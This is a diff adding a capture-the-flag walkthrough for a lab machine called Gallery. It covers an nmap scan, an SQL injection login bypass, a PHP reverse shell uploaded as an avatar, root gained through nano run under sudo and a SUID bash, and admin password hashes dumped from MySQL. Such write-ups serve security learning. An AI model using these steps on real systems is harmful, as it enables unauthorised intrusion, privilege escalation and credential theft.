@@ -1,0 +1,73 @@
+<h1>Nmap</h1>
+Scanning the IP we find that web servers are running on port 80 and 8080
+<pre><code>PORT     STATE SERVICE REASON  VERSION
+80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+8080/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: 7427B4DBE044649EA9A695BC6DEDADE2
+|_http-title: Simple Image Gallery System
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS</code></pre>
+<h1>SQL Injection</h1>
+On port 8080 we find a login Page
+<br><br><img src="assets/login.png"><br><br>
+when we try random login, on interception we find that it runs a <code>sql</code> query
+<br><br><img src="assets/sql.png"><br><br>
+This can be easily bypassed by <code>SQl injection</code> using username as <code>' or 1=1 -- -</code> and password as anything.
+After logging in and going to the My Account page we find an upload link to aupload our avatar.
+<h1>Reverse Shell</h1>
+<br><br><img src="assets/avatar.png"><br><br>
+Lets try uploading a PHP reverse shell. Using <code><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" style="color: lightblue; text-decoration: underline;">pentestmonkey php reverseshell</a></code> we get a reverseshell.
+<br><br><img src="assets/revshell.png"><br><br>
+Lets stabalize the shell using <code><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat" style="color: lightblue; text-decoration: underline;">socat</a></code> and export the environment variable <code>TERM</code> for tty.
+After stabalizing the shell and running <code>linpeas</code> we find the password for user mike.
+<br><br><img src="assets/linpeas.png"><br><br>
+We find user.txt in the home directory of user mike.
+<h1>Privilage Escalation</h1>
+Running <code>sudo -l</code> we find that user mike can run <code>/opt/rootkit.sh</code> as root.
+<pre><code>Matching Defaults entries for mike on gallery:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mike may run the following commands on gallery:
+    (root) NOPASSWD: /bin/bash /opt/rootkit.sh</code></pre>
+On reading the script in <code>rootkit.sh</code> we find that on using read command we will get a nano editor which will be opened as root.
+<pre><code>#!/bin/bash
+
+read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;
+
+# Execute your choice
+case $ans in
+    versioncheck)
+        /usr/bin/rkhunter --versioncheck ;;
+    update)
+        /usr/bin/rkhunter --update;;
+    list)
+        /usr/bin/rkhunter --list;;
+    read)
+        /bin/nano /root/report.txt;;
+    *)
+        exit;;
+esac</code></pre>
+lets run <code>sudo /bin/bash /opt/rootkit.sh</code> and give it the option read.
+After getting the nano we can use <code>^R^X</code> to execute a command.
+The command we will run is <code>chmod a+s /bin/bash</code> to set SUID on the bash.
+After running and exiting the nano we get root shell by using <code>bash -p</code>
+<br><br><img src="assets/root.png"><br><br> and we get root.txt in root directory.
+<h1>Password hash</h1>
+As for the admin password's hash, we login to mysql and try to find the password there.
+In the directory of the server we find creds for db in <code>initialize.php</code>
+<br><br><img src="assets/creds.png"><br><br>
+After logging in as the user <code>gallery_user</code> We get the following databases
+<br><br><img src="assets/dbs.png"><br><br> After switching to <code>gallery_db</code> database we get that it contains a table for user and their password hashes.
+using the query <code>select * from users</code> we find the password hash for user admin.
